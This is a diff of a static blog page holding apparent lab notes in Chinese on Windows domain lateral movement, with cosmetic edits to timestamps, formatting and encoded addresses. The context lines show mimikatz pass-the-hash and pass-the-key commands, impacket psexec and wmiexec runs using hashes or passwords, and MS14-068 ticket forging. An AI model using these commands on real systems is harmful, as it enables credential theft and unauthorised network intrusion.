@@ -33,7 +33,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220405133254579.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220405134813532.png">
 <meta property="article:published_time" content="2022-03-31T04:51:36.018Z">
-<meta property="article:modified_time" content="2022-04-07T13:27:08.309Z">
+<meta property="article:modified_time" content="2022-04-11T03:07:59.854Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="knowledge">
 <meta name="twitter:card" content="summary">
@@ -398,7 +398,8 @@
 <blockquote>
 <p>privilege::debug</p>
 <p>sekurlsa::pth /user:Administrator /domain:god /ntlm:8a963371a63944419ec1adf687bb1be5  //使用ntlm传递</p>
-<h4 id="Pass-the-key"><a href="#Pass-the-key" class="headerlink" title="Pass the key"></a>Pass the key</h4><p>也可以用AES-256等传递，<strong>获取：sekurlsa::ekeys</strong>  </p>
+<p><strong>Pass the key</strong></p>
+<p>也可以用AES-256等传递，<strong>获取：sekurlsa::ekeys</strong>  </p>
 <p>还是使用IPC等无密码连接到目AES标主机，dir \STU1\C$</p>
 </blockquote>
 <p>可见，没有进行hash修改的IPC等连接会出现登录失败</p>
@@ -425,7 +426,7 @@
 <p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220405133254579.png" srcset="/img/loading.gif" lazyload></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">impacket</a></p>
 <blockquote>
-<p>python psexec.py  <a href="mailto:&#x41;&#x64;&#x6d;&#105;&#110;&#x69;&#x73;&#116;&#114;&#97;&#116;&#x6f;&#114;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#x32;&#x30;&#x2e;&#49;&#50;&#x38;">&#x41;&#x64;&#x6d;&#105;&#110;&#x69;&#x73;&#116;&#114;&#97;&#116;&#x6f;&#114;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#x32;&#x30;&#x2e;&#49;&#50;&#x38;</a>   -hashes 11cb3f697332ae4c82681f36d6708901:aba61272394a2f975d6543aa0541b005</p>
+<p>python psexec.py  <a href="mailto:&#x41;&#x64;&#109;&#105;&#110;&#x69;&#x73;&#116;&#114;&#97;&#116;&#111;&#x72;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#46;&#50;&#48;&#x2e;&#x31;&#50;&#x38;">&#x41;&#x64;&#109;&#105;&#110;&#x69;&#x73;&#116;&#114;&#97;&#116;&#111;&#x72;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#46;&#50;&#48;&#x2e;&#x31;&#50;&#x38;</a>   -hashes 11cb3f697332ae4c82681f36d6708901:aba61272394a2f975d6543aa0541b005</p>
 </blockquote>
 <p><a target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows">impacket-win</a></p>
 <p>微软自带的psexec我是通过使用mimikatz哈希传递后建立IPC连接然后psexec去获得shell，这个工具包可以自己pth</p>
@@ -440,7 +441,7 @@
 <p>connection:<br>-dc-ip ip address     IP Address of the domain controller. If omitted it<br>                     will use the domain part (FQDN) specified in the<br>                     target parameter<br>-target-ip ip address<br>                     IP Address of the target machine. If omitted it will<br>                     use whatever was specified as target. This is useful<br>                     when target is the NetBIOS name and you cannot resolve<br>                     it<br>-port [destination port]<br>                     Destination port to connect to SMB Server<br>-service-name service name<br>                     This will be the name of the service</p>
 </blockquote>
 <blockquote>
-<p>psexec.exe <a href="mailto:&#x41;&#x64;&#109;&#105;&#x6e;&#x69;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#x2e;&#50;&#x30;&#x2e;&#49;&#50;&#56;">&#x41;&#x64;&#109;&#105;&#x6e;&#x69;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#x2e;&#50;&#x30;&#x2e;&#49;&#50;&#56;</a> -hashes 11cb3f697332ae4c82681f36d6708901:aba61272394a2f975d6543aa0541b005</p>
+<p>psexec.exe <a href="mailto:&#65;&#100;&#109;&#105;&#x6e;&#105;&#x73;&#x74;&#x72;&#97;&#x74;&#x6f;&#114;&#64;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#46;&#x32;&#48;&#46;&#49;&#50;&#x38;">&#65;&#100;&#109;&#105;&#x6e;&#105;&#x73;&#x74;&#x72;&#97;&#x74;&#x6f;&#114;&#64;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#46;&#x32;&#48;&#46;&#49;&#50;&#x38;</a> -hashes 11cb3f697332ae4c82681f36d6708901:aba61272394a2f975d6543aa0541b005</p>
 <p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220405134813532.png" srcset="/img/loading.gif" lazyload></p>
 </blockquote>
 <p>msf也有psexec模块</p>
@@ -460,7 +461,7 @@
 <p>还是使用impacket的两个工具包，有些还支持socks代理</p>
 <blockquote>
 <p>wmiexec.exe domain/user:password@target-ip</p>
-<p>wmiexec.exe QWE/Administrator:p@<a href="mailto:&#x73;&#115;&#119;&#111;&#x72;&#x64;&#49;&#x32;&#51;&#46;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#50;&#48;&#x2e;&#49;&#x32;&#56;">&#x73;&#115;&#119;&#111;&#x72;&#x64;&#49;&#x32;&#51;&#46;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#50;&#48;&#x2e;&#49;&#x32;&#56;</a></p>
+<p>wmiexec.exe QWE/Administrator:p@<a href="mailto:&#x73;&#x73;&#119;&#x6f;&#x72;&#x64;&#49;&#50;&#x33;&#x2e;&#x40;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#x32;&#48;&#x2e;&#49;&#x32;&#x38;">&#x73;&#x73;&#119;&#x6f;&#x72;&#x64;&#49;&#50;&#x33;&#x2e;&#x40;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#x32;&#48;&#x2e;&#49;&#x32;&#x38;</a></p>
 </blockquote>
 <ol start="4">
 <li><a target="_blank" rel="noopener" href="https://github.com/sunorr/smbexec">smbexec</a></li>
@@ -541,7 +542,7 @@
 <p>找利用工具：<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068</a></p>
 <p>生成TGT(ccache)</p>
 <blockquote>
-<p>MS14-068 -u <a href="mailto:&#116;&#x65;&#115;&#116;&#x40;&#x51;&#87;&#x45;&#x2e;&#105;&#x6f;">&#116;&#x65;&#115;&#116;&#x40;&#x51;&#87;&#x45;&#x2e;&#105;&#x6f;</a> -s S-1-5-21-264158955-2367710963-2250079592-1105 -d DC.QWE.io -p p@ssword123.</p>
+<p>MS14-068 -u <a href="mailto:&#116;&#101;&#115;&#x74;&#x40;&#81;&#x57;&#x45;&#x2e;&#x69;&#x6f;">&#116;&#101;&#115;&#x74;&#x40;&#81;&#x57;&#x45;&#x2e;&#x69;&#x6f;</a> -s S-1-5-21-264158955-2367710963-2250079592-1105 -d DC.QWE.io -p p@ssword123.</p>
 </blockquote>
 <p>mimikatz注入票据</p>
 <blockquote>
@@ -677,6 +678,12 @@
                 <div class="post-prevnext">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2022/04/11/%E5%88%9D%E6%8E%A2Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">初探Docker容器逃逸</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
